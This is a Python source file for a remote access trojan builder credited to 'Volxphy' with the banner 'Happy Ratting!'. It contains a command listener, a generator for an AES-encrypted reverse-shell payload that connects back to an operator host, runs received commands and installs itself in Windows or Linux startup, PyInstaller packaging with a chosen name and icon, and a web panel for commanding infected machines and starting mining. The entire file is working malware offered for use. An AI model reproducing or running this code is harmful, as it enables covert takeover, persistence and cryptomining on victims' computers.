import os
import base64
import subprocess
import socket
import platform
import sys
from threading import Thread
from colorama import Fore, Style
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from flask import Flask, render_template, request, jsonify

# Initialize Flask app
app = Flask(__name__)

# A simple in-memory storage for active machines (in a real scenario, use a database)
machines = {}

def welcome_screen():
    print(Fore.RED + """
░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓███████▓▒░ ░▒▓██████▓▒░▒▓████████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░     
 ░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░     
 ░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░       ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░░▒▓██████▓▒░       ░▒▓███████▓▒░░▒▓████████▓▒░ ░▒▓█▓▒░     
  ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░          ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░     
  ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░          ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░     
   ░▒▓██▓▒░   ░▒▓██████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░          ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░     
                           made with ♥️ by Volxphy
            Happy Ratting!                                                                                                               
                                                                                                                                          
    """)
    print(Fore.YELLOW + "1. RDP to another computer")
    print(Fore.YELLOW + "2. Start netcat-like listener")
    print(Fore.YELLOW + "3. Generate reverse access script")
    print(Fore.YELLOW + "4. Start WebUI")
    print(Fore.RED + "5. Exit" + Style.RESET_ALL)

def rdp_connect():
    ip = input(Fore.CYAN + "Enter the target IP: " + Style.RESET_ALL)
    username = input(Fore.CYAN + "Enter the username: " + Style.RESET_ALL)
    command = f"mstsc /v:{ip}"
    subprocess.run(command, shell=True)
    print(Fore.GREEN + "RDP Connection initiated!" + Style.RESET_ALL)

def netcat_listener():
    host = "0.0.0.0"
    port = int(input(Fore.CYAN + "Enter the port to listen on: " + Style.RESET_ALL))
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen(1)
        print(Fore.GREEN + f"Listening on {host}:{port}..." + Style.RESET_ALL)
        
        conn, addr = s.accept()
        print(Fore.GREEN + f"Connection established with {addr}!" + Style.RESET_ALL)
        
        with conn:
            while True:
                cmd = input(Fore.CYAN + "$ " + Style.RESET_ALL)
                if cmd.lower() in ["exit", "quit"]:
                    break
                conn.sendall(cmd.encode())
                data = conn.recv(1024)
                print(data.decode())

def generate_key():
    return base64.b64encode(os.urandom(32)).decode()

def encrypt_payload(key, payload):
    key = base64.b64decode(key)
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_payload = padder.update(payload.encode()) + padder.finalize()
    ciphertext = encryptor.update(padded_payload) + encryptor.finalize()
    return base64.b64encode(iv + ciphertext).decode()

def decrypt_payload(key, encrypted_payload):
    key = base64.b64decode(key)
    encrypted_payload_bytes = base64.b64decode(encrypted_payload)
    iv = encrypted_payload_bytes[:16]
    ciphertext = encrypted_payload_bytes[16:]
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded_payload = decryptor.update(ciphertext) + decryptor.finalize()
    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
    payload = unpadder.update(padded_payload) + unpadder.finalize()
    return payload.decode()

def build_as_exe(script_name, exe_name, icon_path=None):
    # Construct the PyInstaller command
    command = f"pyinstaller --onefile --name {exe_name}"
    
    if icon_path:
        command += f" --icon {icon_path}"
    
    command += f" {script_name}"
    
    # Run the PyInstaller command
    subprocess.run(command, shell=True)
    print(Fore.GREEN + f"{exe_name} compiled to EXE!" + Style.RESET_ALL)

def ra_generator():
    host_ip = input(Fore.CYAN + "Enter the host IP: " + Style.RESET_ALL)
    port = int(input(Fore.CYAN + "Enter the port: " + Style.RESET_ALL))
    
    key = generate_key()
    print(Fore.CYAN + f"Generated encryption key: {key}" + Style.RESET_ALL)

    custom_message = input(Fore.CYAN + "Enter a custom console print message: " + Style.RESET_ALL)

    payload = f'''
import socket
import subprocess
import os
import platform
import sys

def connect():
    print("{custom_message}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{host_ip}", {port}))
    
    while True:
        cmd = s.recv(1024).decode()
        if cmd.lower() == "exit":
            break
        output = subprocess.getoutput(cmd)
        s.send(output.encode())
    
    s.close()

def add_to_startup():
    if platform.system() == "Windows":
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        startup_script = os.path.join(startup_folder, "reverse_access.pyw")
        with open(startup_script, "w") as f:
            f.write(f'@echo off\\n"{{sys.executable}}" "{{os.path.abspath(__file__)}}"\\n')
        print("Added to Windows startup.")
    
    elif platform.system() == "Linux":
        startup_folder = os.path.expanduser(f"~/.config/autostart/")
        if not os.path.exists(startup_folder):
            os.makedirs(startup_folder)
        startup_script = os.path.join(startup_folder, "reverse_access.desktop")
        with open(startup_script, "w") as f:
            f.write(f"[Desktop Entry]\\nType=Application\\nExec=python3 {{os.path.abspath(__file__)}}\\nHidden=false\\nX-GNOME-Autostart-enabled=true\\nName=reverse_access\\n")
        os.chmod(startup_script, 0o755)
        print("")

add_to_startup()
connect()
'''

    encrypted_payload = encrypt_payload(key, payload)
    
    ra_script = f"""
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import base64
import socket
import subprocess
import os
import platform
import sys

encrypted_payload = "{encrypted_payload}"
encryption_key = base64.b64decode("{key}")

def decrypt_payload(key, encrypted_payload):
    encrypted_payload_bytes = base64.b64decode(encrypted_payload)
    iv = encrypted_payload_bytes[:16]
    ciphertext = encrypted_payload_bytes[16:]
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded_payload = decryptor.update(ciphertext) + decryptor.finalize()
    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
    payload = unpadder.update(padded_payload) + unpadder.finalize()
    return payload.decode()

payload = decrypt_payload(encryption_key, encrypted_payload)

exec(payload)
"""
    
    with open("reverse_access.py", "w") as f:
        f.write(ra_script)
    
    print(Fore.GREEN + "Generated reverse_access.py with encrypted payload!" + Style.RESET_ALL)
    
    exe_name = input(Fore.CYAN + "Enter the desired name for the executable: " + Style.RESET_ALL).strip()
    icon_path = input(Fore.CYAN + "Enter the path to the icon file (optional): " + Style.RESET_ALL).strip()
    
    if not icon_path:
        icon_path = None

    if input(Fore.CYAN + "Do you want to compile to EXE? (y/n): " + Style.RESET_ALL).strip().lower() == 'y':
        build_as_exe("reverse_access.py", exe_name, icon_path)

def start_webui():
    @app.route('/')
    def home():
        return render_template('index.html', machines=machines)

    @app.route('/machine/<machine_id>')
    def machine_details(machine_id):
        machine = machines.get(machine_id, {})
        return render_template('machine.html', machine=machine)
    
    @app.route('/command/<machine_id>', methods=['POST'])
    def execute_command(machine_id):
        command = request.form.get('command')
        machine = machines.get(machine_id, {})
        response = "Command not executed."
        if machine:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((machine['address'], machine['port']))
                    s.sendall(command.encode())
                    result = s.recv(4096).decode()
                    response = result
            except Exception as e:
                response = str(e)
        return jsonify({'response': response})

    @app.route('/start_mining/<machine_id>', methods=['POST'])
    def start_mining(machine_id):
        machine = machines.get(machine_id, {})
        response = "Mining not started."
        if machine:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((machine['address'], machine['port']))
                    s.sendall(b'start_mining')
                    result = s.recv(4096).decode()
                    response = result
            except Exception as e:
                response = str(e)
        return jsonify({'response': response})

    @app.route('/get_info/<machine_id>', methods=['GET'])
    def get_info(machine_id):
        machine = machines.get(machine_id, {})
        return jsonify(machine)

    thread = Thread(target=app.run, kwargs={'host': '0.0.0.0', 'port': 5000, 'debug': False})
    thread.daemon = True
    thread.start()
    print(Fore.GREEN + "WebUI is running at http://0.0.0.0:5000" + Style.RESET_ALL)

def main():
    while True:
        welcome_screen()
        choice = input(Fore.CYAN + "Enter your choice: " + Style.RESET_ALL)
        
        if choice == '1':
            rdp_connect()
        elif choice == '2':
            netcat_listener()
        elif choice == '3':
            ra_generator()
        elif choice == '4':
            start_webui()
        elif choice == '5':
            print(Fore.RED + "Exiting..." + Style.RESET_ALL)
            sys.exit()
        else:
            print(Fore.RED + "Invalid choice. Please select a valid option." + Style.RESET_ALL)

if __name__ == "__main__":
    main()
